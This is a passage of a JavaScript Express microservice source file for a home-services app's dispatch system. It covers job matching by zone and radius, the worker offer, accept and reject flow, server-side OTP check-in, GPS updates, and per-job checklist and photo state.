// HomeHelp Dispatch Service
// -------------------------
// Owns job matching + the worker-app job lifecycle (/api/worker/jobs/*). It holds no bookings
// of its own — it reads the open pool + a worker's jobs from the BOOKING service, reads worker
// availability/services/location from the WORKER service, and claims/advances bookings over the
// booking service's internal API. Live GPS + status changes surface to the customer via the
// booking service's realtime events. Owns only ephemeral per-worker skip state.
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import express from 'express'
import {
  makePool, migrate, internalGet, internalPost, tryGet, publishEvent, getSettingInt, callsMasked, bridgeCall,
} from '@homehelp/shared'
// Imported directly, not via the shared index: it carries the jsonwebtoken dep.
import { tokenSubject, assertJwtSecret } from '@homehelp/shared/jwt.js'
import { makeCustomerAuth } from '@homehelp/shared/customer-auth.js'

assertJwtSecret('dispatch') // refuse to boot without a signing secret rather than trust forgeable tokens

const PORT = Number(process.env.PORT || 4007)
const DATABASE_URL = process.env.DATABASE_URL || 'postgres://homehelp:homehelp@localhost:5437/dispatch'
const REDIS_URL = process.env.REDIS_URL || 'redis://localhost:6379'
const WORKER_URL = (process.env.WORKER_URL || 'http://localhost:4004').replace(/\/$/, '')
const BOOKING_URL = (process.env.BOOKING_URL || 'http://localhost:4006').replace(/\/$/, '')
const CATALOG_URL = (process.env.CATALOG_URL || 'http://localhost:4001').replace(/\/$/, '')
const ADMIN_URL = (process.env.ADMIN_URL || 'http://localhost:4010').replace(/\/$/, '')
const AUTH_URL = (process.env.AUTH_URL || 'http://localhost:4002').replace(/\/$/, '')

process.on('unhandledRejection', (e) => console.error('[dispatch] unhandledRejection:', e?.message || e))

const pool = makePool(DATABASE_URL)
const skips = new Map() // workerId -> Set(bookingId) skipped this session
const skipSet = (id) => { if (!skips.has(id)) skips.set(id, new Set()); return skips.get(id) }

async function init() {
  await migrate(pool, [
    `CREATE TABLE IF NOT EXISTS dispatch_offers (worker_id INTEGER PRIMARY KEY, booking_id INTEGER, created TIMESTAMPTZ DEFAULT now())`,
    // Per-job working state for the in-service flow: checklist ticks, before/after photo sets,
    // worker-added extra services, and pause bookkeeping. Keyed by booking — a booking IS a job.
    `CREATE TABLE IF NOT EXISTS job_state (
       booking_id INTEGER PRIMARY KEY,
       checklist JSONB NOT NULL DEFAULT '[]'::jsonb,
       before_photos JSONB NOT NULL DEFAULT '[]'::jsonb,
       after_photos JSONB NOT NULL DEFAULT '[]'::jsonb,
       extras JSONB NOT NULL DEFAULT '[]'::jsonb,
       paused BOOLEAN NOT NULL DEFAULT false,
       paused_ms BIGINT NOT NULL DEFAULT 0,
       paused_at TIMESTAMPTZ,
       updated TIMESTAMPTZ DEFAULT now()
     )`,
    `CREATE TABLE IF NOT EXISTS job_messages (
       id SERIAL PRIMARY KEY,
       booking_id INTEGER NOT NULL,
       sender TEXT NOT NULL,
       body TEXT NOT NULL,
       created TIMESTAMPTZ DEFAULT now()
     )`,
    `CREATE INDEX IF NOT EXISTS job_messages_booking ON job_messages (booking_id, id)`,
    // Step 5/7/8 of the job flow: named before/after photo slots, per-phase notes, and the
    // customer's sign-off + rating. Added as ALTERs so existing job_state rows survive.
    `ALTER TABLE job_state ADD COLUMN IF NOT EXISTS photo_slots JSONB NOT NULL DEFAULT '[]'::jsonb`,
    `ALTER TABLE job_state ADD COLUMN IF NOT EXISTS before_notes TEXT NOT NULL DEFAULT ''`,
    `ALTER TABLE job_state ADD COLUMN IF NOT EXISTS after_notes TEXT NOT NULL DEFAULT ''`,
    `ALTER TABLE job_state ADD COLUMN IF NOT EXISTS signature TEXT`,
    `ALTER TABLE job_state ADD COLUMN IF NOT EXISTS customer_rating INTEGER NOT NULL DEFAULT 0`,
    `ALTER TABLE job_state ADD COLUMN IF NOT EXISTS customer_notes TEXT NOT NULL DEFAULT ''`,
  ])
  console.log('[dispatch] Postgres ready (dispatch_offers, job_state, job_messages)')
}

// Default per-service task list, seeded on first read of a job's state. Mirrors the task lists the
// worker app used to hardcode client-side, so ticks now survive nav/restart and reach the server.
const CHECKLIST_BY_SERVICE = [
  [/bathroom/i, ['Scrub toilet & seat', 'Clean washbasin & mirror', 'Scrub floor & tiles', 'Wipe fittings dry', 'Empty dustbin']],
  [/kitchen/i, ['Clear & wipe counters', 'Clean stove & backsplash', 'Degrease chimney/hob', 'Wipe cabinet fronts', 'Mop floor', 'Take out trash']],
  [/dish/i, ['Wash utensils', 'Rinse & stack to dry', 'Wipe sink area']],
  [/sweep|mop/i, ['Sweep all rooms', 'Mop all rooms', 'Clean under furniture']],
  [/laundry/i, ['Sort colours & whites', 'Run wash cycle', 'Dry & fold', 'Stack neatly']],
  [/window/i, ['Dust frames & grills', 'Wash glass both sides', 'Wipe streak-free']],
  [/fan/i, ['Dust blades', 'Wipe blades damp', 'Clean fan mount']],
  [/fridge|refrigerator/i, ['Empty & discard expired', 'Wipe shelves & trays', 'Clean door seals']],
  [/sofa|upholstery/i, ['Vacuum cushions', 'Spot-treat stains', 'Deodorise fabric']],
]
// Checklist / photos set per service in Admin → Services (catalog), refreshed every minute; the
// built-in lists below are the fallback for services without their own.
let SERVICE_RULES = {}
async function refreshServiceRules() {
  const rules = await tryGet(CATALOG_URL, '/api/internal/service-rules', null)
  if (Array.isArray(rules)) SERVICE_RULES = Object.fromEntries(rules.map((r) => [String(r.name).toLowerCase().trim(), r]))
}
refreshServiceRules(); setInterval(refreshServiceRules, 60000).unref()
const ruleFor = (name) => SERVICE_RULES[String(name || '').toLowerCase().trim()] || null
function defaultChecklist(b) {
  const names = (b.items || []).map((i) => String(i.name || ''))
  const tasks = []
  for (const n of names) {
    const hit = CHECKLIST_BY_SERVICE.find(([re]) => re.test(n))
    const list = ruleFor(n)?.checklist || (hit ? hit[1] : ['Complete the service', 'Tidy the work area'])
    for (const label of list) tasks.push({ label, service: n, done: false })
  }
  if (tasks.length === 0) tasks.push({ label: 'Complete the service', service: '', done: false })
  return tasks.map((t, i) => ({ id: i + 1, ...t }))
}

// The named shots the worker must take before/after, per the job-flow design ("Photos Required
// 2/3" — Kitchen Overall View, Sink Area, …). Derived from the booked service, like the checklist.
const PHOTO_SLOTS_BY_SERVICE = [
  [/kitchen/i, ['Kitchen Overall View', 'Sink Area', 'Cabinets & Platform']],
  [/bathroom/i, ['Bathroom Overall View', 'Toilet & Seat', 'Washbasin & Mirror']],
  [/sweep|mop/i, ['Room Overall View', 'Floor Area', 'Corners & Under Furniture']],
  [/dish/i, ['Sink & Utensils', 'Counter Area']],
  [/laundry/i, ['Clothes Pile', 'Washing Area']],
  [/window/i, ['Window Overall View', 'Glass Close-up']],
  [/fan/i, ['Fan Overall View', 'Blades Close-up']],
  [/sofa|upholstery/i, ['Sofa Overall View', 'Cushions & Corners']],
]
function defaultPhotoSlots(b) {
  const first = (b.items || [])[0]?.name || ''
  const hit = PHOTO_SLOTS_BY_SERVICE.find(([re]) => re.test(first))
  return ruleFor(first)?.photoSlots || (hit ? hit[1] : ['Overall View', 'Work Area'])
}

// Reads a job's state, seeding the row (its checklist + photo slots) on first touch.
// Extra tasks live in the booking service (the customer approves and pays for them there); the job
// state shows them with their live status, and only approved ones count towards the total.
async function jobState(b) {
  const row = await jobStateRaw(b)
  const ex = await tryGet(BOOKING_URL, `/api/internal/bookings/${b.id}/extras`, null)
  if (Array.isArray(ex)) row.extras = ex.filter((e) => e.status !== 'withdrawn').map((e) => ({ id: e.id, name: e.name, price: e.price, status: e.status }))
  return row
}
async function jobStateRaw(b) {
  const q = await pool.query('SELECT * FROM job_state WHERE booking_id=$1', [b.id])
  if (q.rows.length) {
    const row = q.rows[0]
    // Backfill slots for rows created before the photo step existed.
    if (!row.photo_slots || row.photo_slots.length === 0) {
      const up = await pool.query('UPDATE job_state SET photo_slots=$2::jsonb WHERE booking_id=$1 RETURNING *', [b.id, JSON.stringify(defaultPhotoSlots(b))])
      return up.rows[0]
    }
    return row
  }
  const ins = await pool.query(
    `INSERT INTO job_state (booking_id, checklist, photo_slots) VALUES ($1, $2::jsonb, $3::jsonb)
     ON CONFLICT (booking_id) DO UPDATE SET updated=now() RETURNING *`,
    [b.id, JSON.stringify(defaultChecklist(b)), JSON.stringify(defaultPhotoSlots(b))],
  )
  return ins.rows[0]
}

// Milliseconds this job has spent paused, counting an in-flight pause up to now.
const pausedMsNow = (s) =>
  Number(s.paused_ms || 0) + (s.paused && s.paused_at ? Date.now() - new Date(s.paused_at).getTime() : 0)

const stateDto = (s) => ({
  checklist: s.checklist || [],
  photoSlots: s.photo_slots || [],
  beforePhotos: s.before_photos || [],
  afterPhotos: s.after_photos || [],
  beforeNotes: s.before_notes || '',
  afterNotes: s.after_notes || '',
  signature: s.signature || null,
  signed: !!s.signature,
  customerRating: s.customer_rating || 0,
  customerNotes: s.customer_notes || '',
  extras: s.extras || [],
  paused: !!s.paused,
  pausedMs: pausedMsNow(s),
  extrasTotal: (s.extras || []).filter((e) => !e.status || e.status === 'approved').reduce((t, e) => t + Number(e.price || 0), 0),
})

const STATUS_TO_ENUM = { worker_assigned: 'ACCEPTED', on_the_way: 'ON_THE_WAY', arrived: 'ARRIVED', in_progress: 'IN_PROGRESS', completed: 'COMPLETED' }
const ACTIVE = ['worker_assigned', 'on_the_way', 'arrived', 'in_progress']

function distanceKm(aLat, aLng, bLat, bLng) {
  if ([aLat, aLng, bLat, bLng].some((v) => v == null)) return null
  const R = 6371, toR = (d) => (d * Math.PI) / 180
  const dLat = toR(bLat - aLat), dLng = toR(bLng - aLng)
  const s = Math.sin(dLat / 2) ** 2 + Math.cos(toR(aLat)) * Math.cos(toR(bLat)) * Math.sin(dLng / 2) ** 2
  return R * 2 * Math.atan2(Math.sqrt(s), Math.sqrt(1 - s))
}
const workerShare = async (amt) => { const pct = await getSettingInt(ADMIN_URL, 'commission_percent', 20); return Math.max(0, Math.round((amt * (100 - pct)) / 100)) }

// Booked service length in minutes — authoritative value for the live timer / "time completed"
// popup. Prefer the item's durationId (e.g. "90m", "2h"); fall back to parsing the label.
const DUR_MIN = { '30m': 30, '60m': 60, '90m': 90, '2h': 120, '2h30': 150, '3h': 180, '3h30': 210, '4h': 240 }
function bookingDurationMinutes(b) {
  const id = b.items?.[0]?.durationId
  if (id && DUR_MIN[id]) return DUR_MIN[id]
  const s = String(b.duration || '')
  const n = parseInt(s, 10)
  if (!n) return 60
  return /h/i.test(s) && !/min/i.test(s) ? n * 60 : n
}

// Reason menu the worker picks from. `chargeable:false` means the customer is not billed for the
// extra time — kept in sync with EXT_REASONS in the booking service, which is the authority.
const EXT_REASON_LIST = [
  { code: 'customer_request', label: 'Customer requested additional work', chargeable: true },
  { code: 'more_area', label: 'More area/items than expected', chargeable: true },
  { code: 'service_condition', label: 'Service condition requires more time', chargeable: true },
  { code: 'customer_added_task', label: 'Customer added another task', chargeable: true },
  { code: 'scope_incomplete', label: 'Original scope incomplete', chargeable: false },
  { code: 'other', label: 'Other', chargeable: true },
]

// The worker-facing job DTO. It deliberately carries NO `service_otp`: the check-in code is the
// customer's proof of presence, so the worker device must never hold it — the customer reads it
// out and /verify-otp below does the comparison server-side.
async function jobFromBooking(b) {
  const u = await tryGet(AUTH_URL, `/api/internal/users/${b.user_id}`, null)
  const c = u?.user || {}
  const initials = String(c.name || 'C').split(/\s+/).map((p) => p[0]).join('').slice(0, 2).toUpperCase()
  const masked = await callsMasked(ADMIN_URL) // calls go through the bridge — the app never gets the number
  return {
    id: b.ref, bookingId: b.id, customerName: c.name || 'Customer', initials, customerAvatar: c.avatar || '', customerPhone: masked ? '' : (c.phone || ''), customerRating: c.rating || 5.0,
    customerType: b.type || 'Residential', note: b.note || '',
    services: (b.items || []).map((i) => i.name), dateTime: [b.date, b.time].filter(Boolean).join(', ') || new Date(b.created).toLocaleString(),
    durationHours: Math.max(1, parseInt(b.duration, 10) || 2), durationMinutes: bookingDurationMinutes(b), address: b.address, area: (b.address || '').split(',').slice(-2).join(',').trim() || b.address,
    distanceKm: +(1 + (b.id % 30) / 10).toFixed(1), earnings: await workerShare(b.total),
    lat: b.cust_lat ?? (17.4448 + (b.id % 10) * 0.002), lng: b.cust_lng ?? (78.3498 + (b.id % 10) * 0.002),
    startedAt: b.started_at || null, completedAt: b.completed_at || null,
    // Extra approved time rides alongside the booked duration — the base figure keeps meaning
    // "what was booked", and extensionMinutes is the tally granted.
    extensionMinutes: b.extension_minutes || 0,
    // Where the clock actually ends (booking service owns the rule): time approved after an
    // overrun runs FROM approval, so start + booked + extension would under-count it. Null until
    // the job is extended — the app then falls back to that sum.
    serviceEndAt: b.service_end_at || null,
  }
}

// Candidate bookings this worker qualifies for (service match, not skipped), nearest first.
async function matchingBookings(w) {
  const svc = new Set((w.services || []).map((s) => String(s).toLowerCase().trim()))
  if (svc.size === 0) return []
  const pool_ = await tryGet(BOOKING_URL, '/api/internal/pool', [])
  const skip = skipSet(w.id)
  const cands = []
  // Per-call cache of each zone's capacity so we fetch a zone's Max Travel Distance at most once.
  const capCache = new Map()
  const capFor = async (zid) => {
    if (zid == null) return null
    if (capCache.has(zid)) return capCache.get(zid)
    const r = await tryGet(CATALOG_URL, `/api/internal/zone-capacity?zoneId=${zid}`, null)
    const cap = r?.capacity || null; capCache.set(zid, cap); return cap
  }
  /* Coverage. When a worker is RESTRICTED (allowOutsideRadius === false) their zone stops being a
   * preference and becomes a filter, and their job radius is measured from their assigned store —
   * which is what makes the admin screen's "only jobs within the assigned zone" true rather than a
   * hopeful label. Left open (the default), the old soft-preference behaviour stands and nobody in
   * a quiet zone sits idle next to work they could do.
   */
  const wz = w.zone_id ?? null
  // Zones are isolated: a worker only ever sees jobs from their own zone, and a worker with no zone
  // sees none. (allowOutsideRadius used to let any worker pick up other zones' jobs.)
  if (wz == null) return []
  const restricted = w.allowOutsideRadius === false
  const radiusKm = Number(w.jobRadiusKm) || 0
  // The store's location, fetched at most once per call — the radius is measured from it, not from
  // the worker's live GPS, because that is what the admin drew a circle around.
  let store = null
  if (restricted && radiusKm > 0 && w.storeId) {
    const r = await tryGet(CATALOG_URL, `/api/internal/stores/${w.storeId}`, null)
    if (r && r.lat != null && r.lng != null) store = { lat: Number(r.lat), lng: Number(r.lng) }
    else console.error(`[dispatch] worker ${w.id} has a ${radiusKm}km radius but store ${w.storeId} has no location — radius not applied`)
  }

  for (const b of pool_) {
    if (skip.has(b.id)) continue
    // Already offered to someone else — theirs until they answer or it lapses.
    if (b.offer_worker_id != null && Number(b.offer_worker_id) !== Number(w.id)) continue
    const names = (b.items || []).map((i) => String(i.name || '').toLowerCase().trim())
    if (!names.some((n) => svc.has(n))) continue
    // Own zone only — for everyone.
    if (Number(b.zone_id) !== Number(wz)) continue
    // Restricted: within their radius of their store. Only when we actually know where the store
    // is — a radius we cannot measure must not silently drop every job.
    if (restricted && store && radiusKm > 0) {
      if (distanceKm(store.lat, store.lng, b.cust_lat, b.cust_lng) > radiusKm) continue
    }
    const dist = w.last ? distanceKm(w.last.lat, w.last.lng, b.cust_lat, b.cust_lng) : null
    // Max Travel Distance: don't offer a job to a worker farther than the job's zone allows.
    // Independent of the per-worker radius — whichever is tighter wins.
    if (dist != null) {
      const maxKm = Number((await capFor(b.zone_id))?.maxTravelKm) || 0
      if (maxKm > 0 && dist > maxKm) continue
    }
    cands.push({ b, dist })
  }
  // All candidates are in the worker's zone; rank nearest by GPS.
  cands.sort((a, c) => {
    const az = wz != null && a.b.zone_id === wz ? 0 : 1
    const cz = wz != null && c.b.zone_id === wz ? 0 : 1
    if (az !== cz) return az - cz
    const ad = a.dist ?? Infinity, cd = c.dist ?? Infinity
    return ad !== cd ? ad - cd : a.b.id - c.b.id
  })
  return cands.map((x) => x.b)
}

async function activeBooking(wid) {
  const mine = await tryGet(BOOKING_URL, `/api/internal/bookings?worker_id=${wid}`, [])
  return mine.find((b) => ACTIVE.includes(b.status)) || null
}

const app = express()
app.use(express.json({ limit: '6mb' }))
app.get('/health', (_q, res) => res.json({ service: 'dispatch', ok: true }))

// Worker auth: verify the SIGNED token, then load the worker's service-set/location from the
// worker svc. This used to parse the id straight out of `worker-<id>`, so `Bearer worker-6`
// exposed another worker's job offers — the same hole the worker/auth/admin services had.
async function auth(req, res, next) {
  const id = tokenSubject(req.headers.authorization, 'worker')
  if (!Number.isFinite(id)) return res.status(401).json({ ok: false, error: 'Not authenticated' })
  const w = await tryGet(WORKER_URL, `/internal/workers/${id}/service-set`, null)
  if (!w || w.status !== 'active') return res.status(401).json({ ok: false, error: 'Not authenticated' })
  req.worker = { id, ...w }
  // The app's background alert service polls offers here every few seconds while the expert is
  // Online — that is the proof they're reachable, so pass it on (throttled) as "last seen".
  const now = Date.now()
  if (now - (seenSent.get(id) || 0) > 60000) { seenSent.set(id, now); internalPost(WORKER_URL, `/internal/workers/${id}/seen`, {}).catch(() => {}) }
  next()
}
const seenSent = new Map()

// Customer auth, for the customer half of the job chat below. The messages live in THIS service's
// database, so the customer's routes belong here next to the worker's rather than being proxied
// through the booking service.
const customerAuth = makeCustomerAuth(AUTH_URL)

/* Phase 11: the worker's own stated weekly hours cap.
 * Enforced here rather than in the app, because the app isn't the only thing that can call this.
 * It's the ONE availability preference that gates: jobs are pull-based, so refusing a worker who
 * is actively asking for work because they'd marked the day off would be absurd — but a cap they
 * set on themselves is a boundary worth holding when they're tired enough to ignore it.
 */
const cappedMsg = (wl) => `You've reached the ${wl.maxWeeklyHours}h weekly limit you set (${wl.hoursThisWeek}h worked). Raise it in Availability if you want more work.`

app.get('/api/worker/jobs/available', auth, async (req, res) => {
  const wl = req.worker.workLimit
  if (wl?.capped) return res.json({ available: false, count: 0, capped: true, reason: cappedMsg(wl) })
  const n = (await matchingBookings(req.worker)).length
  res.json({ available: n > 0, count: n })
})

/* Identity of the job currently on this worker, or bookingId:null when they have none.
 * /available answers "what could I pull?" and reads the UNASSIGNED pool — so with auto-assign on
 * (the default) it is permanently 0, because the booking service assigns a worker inside the create
 * request and the booking never sits in that pool. The background alert service had nothing to react
 * to and a newly assigned job produced no notification at all. This is the missing "what is mine?"
 * signal: cheap enough to poll, and carries the booking id so the app can tell a NEW assignment from
 * the one it has already announced. Deliberately not /state, which returns working state with no
 * booking identity in it. */
app.get('/api/worker/jobs/current', auth, async (req, res) => {
  const b = await activeBooking(req.worker.id)
  if (!b) return res.json({ ok: true, bookingId: null })
  res.json({
    ok: true,
    bookingId: b.id,
    ref: b.ref || '',
    status: b.status || '',
    service: (b.items || []).map((i) => i.name).filter(Boolean).join(', '),
  })
})

/* Is the offer the app is showing still real, and how long is left on it?
 *
 * The accept window used to be a local countdown in NewJobScreen, and nothing ever checked whether
 * the booking was still up for grabs — so a worker could sit on a full 2:00 timer for a job another
 * worker had already taken, and only learn it from a 409 when they finally tapped Accept. The app
 * polls this while an offer is pending and drops the screen the moment the answer stops being
 * PENDING.
 *
 * Both terminal answers release the offer here rather than waiting for the worker svc sweep, so the
 * booking returns to the pool immediately.
 */
const OFFER_TTL_SEC = Number(process.env.OFFER_TTL_SEC || 120)
async function releaseOffer(workerId, bookingId, outcome) {
  await internalPost(WORKER_URL, `/internal/workers/${workerId}/offered`, { bookingId: null })
  if (outcome) await internalPost(WORKER_URL, `/internal/workers/${workerId}/offer-outcome`, { bookingId, outcome })
}
app.get('/api/worker/jobs/offer', auth, async (req, res) => {
  const offeredId = req.worker.offered_booking
  if (!offeredId) return res.json({ ok: true, state: 'NONE', bookingId: null, remainingSec: 0 })

  // No stamp means the offer predates offered_at — treat it as fresh rather than instantly killing
  // an offer the worker is legitimately looking at.
  const offeredAtMs = req.worker.offered_at ? Date.parse(req.worker.offered_at) : Date.now()
  const elapsedSec = Math.floor((Date.now() - offeredAtMs) / 1000)
  const remainingSec = Math.max(0, OFFER_TTL_SEC - elapsedSec)

  if (remainingSec <= 0) {
    await releaseOffer(req.worker.id, offeredId, 'declined')
    return res.json({ ok: true, state: 'EXPIRED', bookingId: offeredId, remainingSec: 0 })
  }

  // Still claimable only while unassigned — assign() sets worker_id and moves it off 'confirmed'.
  const b = await tryGet(BOOKING_URL, `/api/internal/bookings/${offeredId}`, null)
  const takenByOther = !b || (b.worker_id != null && Number(b.worker_id) !== req.worker.id) || (b.status && b.status !== 'confirmed')
  if (takenByOther) {
    // Not counted as a decline: the worker was never given the chance to answer, so it must not
    // dent their acceptance rate.
    await releaseOffer(req.worker.id, offeredId, null)
    return res.json({ ok: true, state: 'TAKEN', bookingId: offeredId, remainingSec: 0 })
  }

  // The job payload rides along so the app can raise the offer screen straight from this poll.
  // Offers are now PUSHED by the booking service, so the app can no longer rely on having called
  // /jobs/request to already hold the job it is being asked about.
  res.json({ ok: true, state: 'PENDING', bookingId: offeredId, remainingSec, job: await jobFromBooking(b) })
})

app.post('/api/worker/jobs/request', auth, async (req, res) => {
  const wl = req.worker.workLimit
  // Suspended for too many Red Cards: no new work until operations reinstate them.
  if (req.worker.suspended) return res.json({ job: null, jobStatus: 'NONE', suspended: true, error: 'Your account is suspended for too many Red Cards. See My Performance.' })
  if (wl?.capped) return res.json({ job: null, jobStatus: 'NONE', capped: true, error: cappedMsg(wl) })
  // One job at a time: a worker mid-job gets no new work.
  if (await activeBooking(req.worker.id)) return res.json({ job: null, jobStatus: 'NONE', error: 'Finish your current job first.' })
  const match = (await matchingBookings(req.worker))[0]
  if (!match) return res.json({ job: null, jobStatus: 'NONE' })
  await internalPost(WORKER_URL, `/internal/workers/${req.worker.id}/offered`, { bookingId: match.id })
  res.json({ job: await jobFromBooking(match), jobStatus: 'REQUESTED' })
})

app.post('/api/worker/jobs/accept', auth, async (req, res) => {
  const offeredId = req.worker.offered_booking
  // Age the offer BEFORE clearing it, so a late tap loses the job even if the app's own countdown
  // never ran (screen closed, process killed) — the deadline can't be dodged by not looking at it.
  const offeredAtMs = req.worker.offered_at ? Date.parse(req.worker.offered_at) : null
  const staleOffer = offeredAtMs != null && Math.floor((Date.now() - offeredAtMs) / 1000) > OFFER_TTL_SEC
  await internalPost(WORKER_URL, `/internal/workers/${req.worker.id}/offered`, { bookingId: null })
  if (!offeredId) return res.status(409).json({ ok: false, error: 'Job no longer available' })
  if (staleOffer) {
    await internalPost(WORKER_URL, `/internal/workers/${req.worker.id}/offer-outcome`, { bookingId: offeredId, outcome: 'declined' })
    return res.status(409).json({ ok: false, error: 'This job expired — the 2-minute window passed' })
  }
  // Log the acceptance before claiming: the worker said yes, so it counts toward their
  // acceptance rate even if another worker wins the race for the booking below.
  await internalPost(WORKER_URL, `/internal/workers/${req.worker.id}/offer-outcome`, { bookingId: offeredId, outcome: 'accepted' })
  const claim = await internalPost(BOOKING_URL, `/api/internal/bookings/${offeredId}/assign`, { worker_id: req.worker.id, pro_name: req.worker.name, pro_rating: req.worker.rating })
  if (!claim.ok) return res.status(409).json({ ok: false, error: 'Job already taken by another expert' })
  publishEvent(REDIS_URL, 'job.accepted', { bookingId: offeredId, workerId: req.worker.id, ref: claim.booking?.ref })
  publishEvent(REDIS_URL, 'activity', { actorType: 'worker', actorId: req.worker.id, actorName: req.worker.name, action: 'job.accept', entityType: 'booking', entityId: offeredId, ref: claim.booking?.ref, detail: `${req.worker.name} accepted the job` })
  res.json({ ok: true, jobStatus: 'ACCEPTED', activeJob: await jobFromBooking(claim.booking) })
})

app.post('/api/worker/jobs/reject', auth, async (req, res) => {
  if (req.worker.offered_booking) {
    const offeredId = req.worker.offered_booking
    skipSet(req.worker.id).add(offeredId)
    await internalPost(WORKER_URL, `/internal/workers/${req.worker.id}/offered`, { bookingId: null })
    await internalPost(WORKER_URL, `/internal/workers/${req.worker.id}/offer-outcome`, { bookingId: offeredId, outcome: 'declined' })
    // Hand the booking on. Without this the rejection was purely local to the worker service and
    // the booking sat on its dead offer until the window lapsed, delaying the customer for no
    // reason. Best-effort: the sweep still re-offers if this call fails.
    await internalPost(BOOKING_URL, `/api/internal/bookings/${offeredId}/decline`, { worker_id: req.worker.id }).catch(() => {})
  }
  res.json({ ok: true, jobStatus: 'NONE' })
})

// Move the booking to the expert's next step. The booking service refuses out-of-order steps
// (409); pass its reason back instead of letting the request hang on an unhandled rejection.
async function setStatus(res, b, status) {
  try { await internalPost(BOOKING_URL, `/api/internal/bookings/${b.id}/status`, { status }); return true }
  catch (e) { res.status(e.status && e.status < 500 ? e.status : 502).json({ ok: false, error: e.message }); return false }
}
async function advance(req, res, status) {
  const b = await activeBooking(req.worker.id)
  if (!b) return res.status(409).json({ ok: false, error: 'No active job' })
  if (!(await setStatus(res, b, status))) return
  publishEvent(REDIS_URL, 'activity', { actorType: 'worker', actorId: req.worker.id, actorName: req.worker.name, action: 'job.status', entityType: 'booking', entityId: b.id, ref: b.ref, detail: `Status → ${status.replace(/_/g, ' ')}`, meta: { status } })
  res.json({ ok: true, jobStatus: STATUS_TO_ENUM[status] || status, activeJob: await jobFromBooking({ ...b, status }) })
}
app.post('/api/worker/jobs/on-the-way', auth, (req, res) => advance(req, res, 'on_the_way'))
app.post('/api/worker/jobs/arrived', auth, (req, res) => advance(req, res, 'arrived'))

app.post('/api/worker/jobs/location', auth, async (req, res) => {
  const b = await activeBooking(req.worker.id)
  const lat = Number(req.body?.lat), lng = Number(req.body?.lng)
  if (!b || !isFinite(lat) || !isFinite(lng)) return res.json({ ok: false })
  await internalPost(BOOKING_URL, `/api/internal/bookings/${b.id}/coords`, { worker_lat: lat, worker_lng: lng })
  await internalPost(WORKER_URL, `/internal/workers/${req.worker.id}/location`, { lat, lng })
  const dist = distanceKm(lat, lng, b.cust_lat, b.cust_lng)
  const eta = dist != null ? Math.max(1, Math.round(dist * 2.5)) : null
  res.json({ ok: true, dist: dist != null ? +dist.toFixed(1) : null, eta })
})

// The ONLY place the check-in code is compared. The worker app never receives it (see
// jobFromBooking), so the worker has to be told it by the customer.
app.post('/api/worker/jobs/verify-otp', auth, async (req, res) => {
  const b = await activeBooking(req.worker.id)
  if (!b) return res.status(409).json({ ok: false, error: 'No active job' })
  const given = String(req.body?.otp ?? '').trim()
  const expected = String(b.service_otp ?? '').trim()
  // A blank on either side must never pass — otherwise an empty field would start the job.
  if (!given || !expected || given !== expected) return res.json({ ok: false, error: 'Incorrect OTP. Try again.' })
  if (!(await setStatus(res, b, 'in_progress'))) return
  // Domain event: the wallet service uses this to decide the on-time-start incentive vs late penalty.
  publishEvent(REDIS_URL, 'job.start', { bookingId: b.id, workerId: req.worker.id, ref: b.ref })
  publishEvent(REDIS_URL, 'activity', { actorType: 'worker', actorId: req.worker.id, actorName: req.worker.name, action: 'job.start', entityType: 'booking', entityId: b.id, ref: b.ref, detail: 'Service started (OTP verified)' })
  res.json({ ok: true, jobStatus: 'IN_PROGRESS', activeJob: await jobFromBooking({ ...b, status: 'in_progress' }) })
})

app.post('/api/worker/jobs/end', auth, async (req, res) => {
  const b = await activeBooking(req.worker.id)
  if (!b) return res.status(409).json({ ok: false, error: 'No active job' })
  // The proof photo now comes from the after-photo set captured at step 7; an explicit body photo
  // is still honoured so an older client keeps working.
  if (b.status !== 'in_progress') return res.status(409).json({ ok: false, error: 'Start the service with the customer\'s OTP before completing it.' })
  const st = await jobState(b)
  const proof = req.body?.photo || (st.after_photos || [])[0]?.url || null
  if (proof) await internalPost(BOOKING_URL, `/api/internal/bookings/${b.id}/work-photo`, { url: proof })
  if (!(await setStatus(res, b, 'completed'))) return // booking emits booking.completed → wallet settles
  const shots = (st.after_photos || []).length
  publishEvent(REDIS_URL, 'activity', { actorType: 'worker', actorId: req.worker.id, actorName: req.worker.name, action: 'job.complete', entityType: 'booking', entityId: b.id, ref: b.ref, detail: `Job completed${shots ? ` (${shots} after photo${shots > 1 ? 's' : ''})` : ''}${st.signature ? ' · customer signed' : ''}`, meta: { status: 'completed' } })
  res.json({ ok: true, jobStatus: 'COMPLETED', activeJob: await jobFromBooking({ ...b, status: 'completed' }) })
})

// ─── In-service job state: checklist · photos · extras · pause/resume · chat ──────────────
// All of these hang off the worker's ACTIVE booking, so none of them take an id: the worker app
// only ever drives one live job at a time (mirroring /on-the-way, /arrived, /end above).

const activeOr409 = async (req, res) => {
  const b = await activeBooking(req.worker.id)
  if (!b) { res.status(409).json({ ok: false, error: 'No active job' }); return null }
  return b
}
const saveState = async (id, patch) => {
  const keys = Object.keys(patch)
  const sets = keys.map((k, i) => `${k}=$${i + 2}`).join(', ')
  const vals = keys.map((k) => (typeof patch[k] === 'object' && patch[k] !== null ? JSON.stringify(patch[k]) : patch[k]))
  const q = await pool.query(`UPDATE job_state SET ${sets}, updated=now() WHERE booking_id=$1 RETURNING *`, [id, ...vals])
  return q.rows[0]
}

app.get('/api/worker/jobs/state', auth, async (req, res) => {
  const b = await activeOr409(req, res); if (!b) return
  res.json({ ok: true, ...stateDto(await jobState(b)) })
})

// Whole-list save: the app owns the tick state and posts the list back, so a stale client can
// never resurrect a task the worker removed.
app.post('/api/worker/jobs/checklist', auth, async (req, res) => {
  const b = await activeOr409(req, res); if (!b) return
  await jobState(b)
  const items = Array.isArray(req.body?.items) ? req.body.items : []
  const clean = items.map((t, i) => ({ id: Number(t.id) || i + 1, label: String(t.label || ''), service: String(t.service || ''), done: !!t.done }))
  res.json({ ok: true, ...stateDto(await saveState(b.id, { checklist: clean })) })
})

// Photos are keyed by slot ("Sink Area"), so a retake replaces that shot rather than appending a
// second copy, and "Photos Required (2/3)" can be counted honestly.
app.post('/api/worker/jobs/photos', auth, async (req, res) => {
  const b = await activeOr409(req, res); if (!b) return
  const s = await jobState(b)
  const phase = req.body?.phase === 'after' ? 'after_photos' : 'before_photos'
  const photo = String(req.body?.photo || '')
  const slot = String(req.body?.slot || '').trim() || 'Additional'
  if (!photo.startsWith('data:image/')) return res.status(400).json({ ok: false, error: 'photo must be a data URL' })
  const list = [...(s[phase] || [])].filter((p) => p.slot !== slot)
  list.push({ slot, url: photo, at: new Date().toISOString() })
